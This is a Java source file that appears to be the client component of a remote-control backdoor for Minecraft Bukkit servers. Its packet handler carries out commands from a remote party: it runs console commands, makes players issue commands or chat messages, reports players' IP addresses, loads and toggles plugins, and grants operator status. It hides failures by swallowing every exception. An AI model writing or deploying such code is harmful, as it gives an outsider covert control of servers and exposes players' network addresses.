package me.kutuzov.client;

import me.kutuzov.client.wrapper.BukkitWrapper;
import me.kutuzov.packet.Packet;
import me.kutuzov.packet.bukkit.*;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.plugin.Plugin;

import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetSocketAddress;
import java.util.Arrays;

public class KutuzovBukkitPackets {
    private static BukkitWrapper wrapper = new BukkitWrapper();

    public static void handlePacket(ObjectInputStream ois, ObjectOutputStream oos, Packet packet) {
        if(packet instanceof SCBukkitInfo) {
            try {
                oos.writeObject(new CSBukkitInfo(wrapper.getBukkitVersion(), wrapper.getPort()));
            } catch (IOException exception) {
                // exception.printStackTrace();
            }
        } else if(packet instanceof SCBukkitCommand) {
            wrapper.dispatchCommand(wrapper.getConsoleSender(), ((SCBukkitCommand) packet).getCommand());
        } else if(packet instanceof SCBukkitPlayerCommand) {
            SCBukkitPlayerCommand playerCommand = (SCBukkitPlayerCommand)packet;

            wrapper.dispatchCommand(wrapper.getPlayer(playerCommand.name), playerCommand.command);
        } else if(packet instanceof SCBukkitPlayerChat) {
            SCBukkitPlayerChat playerChat = (SCBukkitPlayerChat)packet;

            wrapper.player_chat(wrapper.getPlayer(playerChat.name), playerChat.message);
        } else if(packet instanceof SCBukkitPlayerAddress) {
            try {
                SCBukkitPlayerAddress inPacket = (SCBukkitPlayerAddress)packet;

                Object player = wrapper.getPlayer(inPacket.name);
                if(player == null) {
                    oos.writeObject(new CSBukkitPlayerAddress("PLAYER NOT FOUND!"));
                    return;
                }

                InetSocketAddress address = wrapper.player_getAddress(player);
                if(address == null) {
                    oos.writeObject(new CSBukkitPlayerAddress("ERROR!"));
                    return;
                }

                oos.writeObject(new CSBukkitPlayerAddress(address.getAddress().getHostAddress()));
            } catch (IOException exception) {
                // exception.printStackTrace();
            }
        } else if(packet instanceof SCBukkitPluginList) {
            try {
                SCBukkitPluginList inPacket = (SCBukkitPluginList)packet;

                Plugin[] bPlugins = Bukkit.getServer().getPluginManager().getPlugins();
                String[] plugins = new String[bPlugins.length];
                for(int i = 0; i < bPlugins.length; i++)
                    plugins[i]=bPlugins[i].getName();

                oos.writeObject(new CSBukkitPluginList(plugins));

            } catch (IOException exception) {
                // exception.printStackTrace();
            }
        } else if(packet instanceof SCBukkitLoadPlugin) {
            try {
                SCBukkitLoadPlugin inPacket = (SCBukkitLoadPlugin)packet;
                Bukkit.getPluginManager().loadPlugin(new File(inPacket.file));
            } catch (Exception exception) {
                // exception.printStackTrace();
                // TODO: Add DEBUG mode on a future.
            }
        } else if(packet instanceof SCBukkitEnablePlugin) {
            try {
                SCBukkitEnablePlugin inPacket = (SCBukkitEnablePlugin)packet;
                Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(inPacket.pluginName));
            } catch (Exception exception) {
                // exception.printStackTrace();
            }
        } else if(packet instanceof SCBukkitDisablePlugin) {
            try {
                SCBukkitDisablePlugin inPacket = (SCBukkitDisablePlugin)packet;
                Bukkit.getPluginManager().disablePlugin(Bukkit.getPluginManager().getPlugin(inPacket.pluginName));
            } catch (Exception exception) {
                // exception.printStackTrace();
            }
        } else if(packet instanceof SCBukkitOperator) {
            try {
                SCBukkitOperator inPacket = (SCBukkitOperator)packet;
                Bukkit.getPlayer(inPacket.player).setOp(true);
            } catch (Exception exception) {

            }
        } else if(packet instanceof SCBukkitGamemode) {
            try {
                SCBukkitGamemode inPacket = (SCBukkitGamemode)packet;
                Bukkit.getPlayer(inPacket.player).setGameMode(GameMode.getByValue(inPacket.gamemode));
            } catch (Exception exception) {

            }
        }
    }
}